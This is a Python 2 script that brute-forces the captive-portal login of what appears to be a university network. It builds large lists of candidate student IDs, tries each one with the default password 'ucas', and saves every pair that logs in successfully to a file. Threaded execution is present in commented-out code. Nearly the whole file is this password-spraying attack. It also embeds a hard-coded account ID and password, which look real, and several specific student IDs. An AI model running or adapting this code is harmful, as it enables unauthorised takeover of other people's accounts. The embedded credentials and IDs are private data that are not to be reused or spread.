#!/usr/bin/env python
# coding=utf-8
import httplib
import urllib
import numpy as np
from subprocess import call
from random import sample
import threading
import time
# ================================================================================
# ================================================================================
loginurl = 'http://210.77.16.21/eportal/InterFace.do?method=login'
# 与网站构建一个连接
#conn = httplib.HTTPConnection("210.77.16.21")
# log in:


def LogIn(username='201428002509008', pwd='M19910602'):
    conn = httplib.HTTPConnection("210.77.16.21")
    # 定义需要进行发送的数据
    params = urllib.urlencode({'userId': username,
                               'password': pwd,
                               'service': '',
                               'queryString': 'wlanuserip%3Df39d702ca0df2e1122829d31d65a97d6%26wlanacname%3D5fcbc245a7ffdfa4%26ssid%3D%26nasip%3D2c0716b583c8ac3cbd7567a84cfde5a8%26mac%3D2c2c6c78c7b7235ba812a97813a78c70%26t%3Dwireless-v2%26url%3D10b762ed394ddf0630d082c452877193a9ccda006ad6acee5c94cbb7a0697990',
                               'operatorPwd': '',
                               'validcode': ''})
    # 定义一些文件头
    headers = {'Host': '210.77.16.21',
               'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
    # 开始进行数据提交   同时也可以使用get进行
    conn.request(method="POST", url=loginurl, body=params, headers=headers)
    # 返回处理后的数据
    response = conn.getresponse()
    res = response.read()
    conn.close()
    if username=='201418014827015':
        print res
    if 'success' in res.split(',')[1]:
#       print username + ':'
        print res
        if username == res.split(',')[2][24:39]:
            print res
            return 0  # username is a right ID
        else:
            return 1  # username is a wrong ID, but we have log on
    else:
        return 2      # username is a wrong ID, and can't log on.
#========================================
# log out:


def LogOut(username='201428002509008', pwd='M19910602'):
    url_out = 'http://210.77.16.21/eportal/logout.jsp?ms2g=http://121.195.186.149/selfservice/module/billself/web/portal_offline_success.jsf?channel=cG9ydGFs&name=af83de2ff40af3fbb290dc23935e6e83&password=05afc01ea8bc8bcb5fbd40510b7c8f02&userIp=210.76.212.66&ip=210.77.16.21&callBack=portal_offline_success'
    # 定义一些文件头
    headers = {'Host': '210.77.16.21',
               'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0'}
    # 与网站构建一个连接
    conn = httplib.HTTPConnection("210.77.16.21")
    # 开始进行数据提交   同时也可以使用get进行
    conn.request(method="GET", url=url_out, headers=headers)
    # 返回处理后的数据
    response = conn.getresponse()
    res = response.read()
    conn.close()
    print username + ':'
    print res
    # 关闭连接

#*************************************************************************
Sb = ['2', '1']
#Year = ['2012', '2013', '2014', '2015','2016']
Year=['2012','2013','2014']
Dw = [str(i) for i in np.loadtxt('../data/danwei.txt', dtype=np.int32)]
Xk = ['%02d' % i for i in np.arange(1, 51)]
xxx = ['%03d' % i for i in np.arange(1, 20)]
XK = Xk[:2]
pwd = 'ucas'
f = open('../ucasID.txt', 'r')
GottenID = f.readlines()
f.close()
GottenID = [i.split('\n')[0].split('\t') for i in GottenID]
ID = {}
for i in GottenID:
    ID[i[0]] = i[1]
#=====
num = 3000
userID = [
    i +
    j +
    k +
    h +
    g for i in Year for j in Sb for k in Dw for h in Xk for g in xxx]
print len(userID)
userID = np.array(sample(userID,num*100))
userID_split = np.split(userID, num)


def RUN_thread(splitNUM=0):
    f=open('../ucasID'+'%02d'%splitNUM+'.txt','a')
#   f = open('../ucasID.txt', 'a')
    ff = open('/tmp/nouseID' + '%02d' % splitNUM + '.txt', 'a')
##########################################################################
##########################################################################
    print len(userID_split[splitNUM])
    for username in userID_split[splitNUM]:
#       time.sleep(np.random.rand()*0.05)
        #       print username
        if username in ID.keys():
            continue
        log = LogIn(username=username, pwd=pwd)
        if log == 0:
            print username
            f.writelines(username + '\t' + pwd + '\n')
            f.close()
            break
        if log == 1:
            break
        if log == 2:
#           ff.writelines(username+'\n')
            continue

    ff.close()


def RUN():
    f=open('../ucasID.txt','a')
#   f = open('../ucasID.txt', 'a')
##########################################################################
##########################################################################
    print len(userID)
    for username in userID:
        #       print username
        if username in ID.keys():
            continue
        log = LogIn(username=username, pwd=pwd)
        if log == 0:
            print username
            f.writelines(username + '\t' + pwd + '\n')
            f.close()
            break
        if log == 1:
            break
        if log == 2:
#           ff.writelines(username+'\n')
            continue
f.close()

#   call('mv /tmp/nouseID'+'%02d'%splitNUM+'.txt ../',shell=True)

##threading###########################
#threads = []
#for i in np.arange(num)[:]:
#    threads.append(threading.Thread(target=RUN_thread, args=(i,)))
######run threading ######################
#if __name__ == '__main__':
#   for t in threads:
#       t.setDaemon(True)
#       time.sleep(0.1*np.random.rand())
#       t.start()
#   t.join()


#RUN()
username = '201528014821006'
pwd = 'ucas'
LogIn(username=username, pwd=pwd)
